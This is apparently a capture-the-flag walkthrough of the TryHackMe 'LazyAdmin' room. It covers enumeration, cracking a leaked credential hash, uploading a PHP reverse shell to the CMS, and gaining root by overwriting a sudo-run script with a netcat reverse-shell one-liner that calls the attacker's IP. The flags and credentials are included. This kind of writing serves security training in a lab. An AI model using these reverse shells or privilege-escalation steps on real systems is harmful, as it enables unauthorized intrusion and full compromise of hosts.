### LazyAdmin


####  Lazy Admin

What is the user flag?
- THM{63e5bce9271952aad1113b6f1ac28a07}


What is the root flag?


Enumeration:

Nmap scan:

Ports 22 and 80 are open:

```
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/LazyAdmin]
└─$ nmap -sC -sV -oN nmap_results.txt 10.10.35.168 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 22:01 EDT
Nmap scan report for 10.10.35.168
Host is up (0.64s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.38 seconds
                                                                                                                       
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/LazyAdmin]
└─$ 

```


Gobuster scan:

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u "http://10.10.35.168:80" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o /home/kali/ken/MoonShine/CTF/LazyAdmin/gobuster_scan.txt -t 64 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.35.168:80
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/08/19 22:02:22 Starting gobuster in directory enumeration mode
===============================================================
/content              (Status: 301) [Size: 314] [--> http://10.10.35.168/content/]
Progress: 935 / 220561 (0.42%)                                                   ^C
[!] Keyboard interrupt detected, terminating.
                                                                                  
===============================================================
2022/08/19 22:02:38 Finished
===============================================================
                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ 

```

Going to /content page, we can see that there is a maintenance page, so we enumerate the /content page further using gobuster:


```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u "http://10.10.35.168/content" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o /home/kali/ken/MoonShine/CTF/LazyAdmin/gobuster_scan2.txt -t 64
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.35.168/content
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/08/19 22:05:02 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 321] [--> http://10.10.35.168/content/images/]
/js                   (Status: 301) [Size: 317] [--> http://10.10.35.168/content/js/]    
/inc                  (Status: 301) [Size: 318] [--> http://10.10.35.168/content/inc/]   
/as                   (Status: 301) [Size: 317] [--> http://10.10.35.168/content/as/]    
/_themes              (Status: 301) [Size: 322] [--> http://10.10.35.168/content/_themes/]
/attachment           (Status: 301) [Size: 325] [--> http://10.10.35.168/content/attachment/]
Progress: 7455 / 220561 (3.38%)                                                             ^C
[!] Keyboard interrupt detected, terminating.
                                                                                             
===============================================================
2022/08/19 22:06:28 Finished
===============================================================
                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ 

```

Using trial and error, we go to every pages, looking for possible attack vectors and low hanging fruit:

![[Pasted image 20220819220737.png]]

Looking further, we see that there is a mysql_backup folder and we will try to open the file:

![[Pasted image 20220819220836.png]]


Opening up the file, we can see that there are lying credentials on the file:

username: manager
password: hashed pw | 42f749ade7f9e195bf475f37a44cafcb


![[Pasted image 20220819220959.png]]

Lets use crackstation to check the hash and hopefully we can get a plaintext password:

![[Pasted image 20220819221123.png]]

Password: Password123

Using those credentials, we can now login to 10.10.35.168/content/as/

![[Pasted image 20220819221220.png]]

After that, we can explore the website and found an ads page where we can advertise (keyword, advertise!) your code:

![[Pasted image 20220819221307.png]]

We can then craft a php reverse shell like so:

![[Pasted image 20220819221346.png]]

and upload it to the ads page:

![[Pasted image 20220819221442.png]]

We can now look for the reverse_shell.php code on the ip:80/content/inc and under ads, we can click our file:


![[Pasted image 20220819221556.png]]
![[Pasted image 20220819221608.png]]

Setup a netcat listener using port 1234, then stabilize the shell, the capture the first flag:


```

┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1234                         
listening on [any] 1234 ...
connect to [10.4.73.167] from (UNKNOWN) [10.10.35.168] 60604
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 05:17:07 up 18 min,  0 users,  load average: 0.00, 0.05, 0.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@THM-Chal:/$ export TERM=xterm
export TERM=xterm
www-data@THM-Chal:/$ ^Z
zsh: suspended  nc -lnvp 1234
                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 1234

www-data@THM-Chal:/$ whoami
www-data
www-data@THM-Chal:/$ ls
bin    dev   initrd.img      lost+found  opt   run   srv  usr      vmlinuz.old
boot   etc   initrd.img.old  media       proc  sbin  sys  var
cdrom  home  lib             mnt         root  snap  tmp  vmlinuz
www-data@THM-Chal:/$ cd home && ls
itguy
www-data@THM-Chal:/home$ cd itguy && ls
Desktop    Downloads  Pictures  Templates  backup.pl         mysql_login.txt
Documents  Music      Public    Videos     examples.desktop  user.txt
www-data@THM-Chal:/home/itguy$ cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
www-data@THM-Chal:/home/itguy$ 


```

To proceed with privilege escalation, we can check for sudo privileges first using sudo -l:

```
www-data@THM-Chal:/home/itguy$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
www-data@THM-Chal:/home/itguy$ 

```

There, we can see that backup.pl can run on sudo privileges. Then opening up backup.pl, we can see that it is running on /etc/copy.sh:

```
www-data@THM-Chal:/home/itguy$ cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
www-data@THM-Chal:/home/itguy$ 

```

cat into copy.sh we can see the following code:

```
www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
www-data@THM-Chal:/home/itguy$ 

```

Since there is a reverse_shell setup already, we can just edit the IP and port, and echo to copy.sh (since we cannot use vim or nano, no privileges)

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.73.167 5554 >/tmp/f" > /etc/copy.sh

```

After that we run our reverse shell using sudo commands

```
www-data@THM-Chal:/home/itguy$ perl /home/itguy/backup.pl
rm: cannot remove '/tmp/f': No such file or directory
www-data@THM-Chal:/home/itguy$ cd ..
www-data@THM-Chal:/home$ sudo /home/itguy/backup.pl
[sudo] password for www-data: 
www-data@THM-Chal:/home$ sudo perl /home/itguy/backup.pl


```

On the listening side:

```
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/LazyAdmin]
└─$ nc -lnvp 5554
listening on [any] 5554 ...
connect to [10.4.73.167] from (UNKNOWN) [10.10.35.168] 50124
# whoami
root
# cat /root/root.txt
THM{6637f41d0177b6f37cb20d775124699f}
# 

```

admin: manager
passwd : 42f749ade7f9e195bf475f37a44cafcb | Password123

Mysql credentials:
rice:randompass

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.73.167 5555 >/tmp/f" > /etc/copy.sh

END